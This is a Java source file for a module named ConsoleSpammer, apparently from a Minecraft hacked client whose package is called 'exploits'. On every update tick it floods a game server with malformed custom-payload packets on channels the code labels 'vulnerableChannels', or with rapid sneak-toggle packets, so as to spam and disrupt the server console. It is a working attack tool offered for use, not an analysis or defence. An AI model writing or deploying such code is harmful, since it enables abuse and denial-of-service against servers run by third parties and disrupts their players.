package slavikcodd3r.rainbow.module.modules.exploits;

import java.util.Random;

import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.player.EnumPlayerModelParts;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0BPacketEntityAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import slavikcodd3r.rainbow.event.EventTarget;
import slavikcodd3r.rainbow.event.MouseEvent;
import slavikcodd3r.rainbow.event.events.TickEvent;
import slavikcodd3r.rainbow.event.events.UpdateEvent;
import slavikcodd3r.rainbow.module.Module;
import slavikcodd3r.rainbow.option.OptionManager;
import slavikcodd3r.rainbow.option.Option.Op;

@Module.Mod(displayName = "ConsoleSpammer")
public class ConsoleSpammer extends Module
{   
	@Op (name = "Action")
	private boolean action;
    private final PacketBuffer payload;
    private final String[] vulnerableChannels;
	Minecraft mc = Minecraft.getMinecraft();
	
	public ConsoleSpammer() {
        this.payload = new PacketBuffer(Unpooled.buffer());
        this.vulnerableChannels = new String[] { "MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem" };
	}
	
	@EventTarget
    private void onUpdate(final UpdateEvent event) {
		if (!this.action) {
		mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload(this.vulnerableChannels[(int) Math.random()], this.payload));
		} else {
		for (int i = 0; i < 5; ++i) {
		mc.getNetHandler().addToSendQueue(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.STOP_SNEAKING));	
		mc.getNetHandler().addToSendQueue(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.START_SNEAKING));	
		}
		}
	}
}
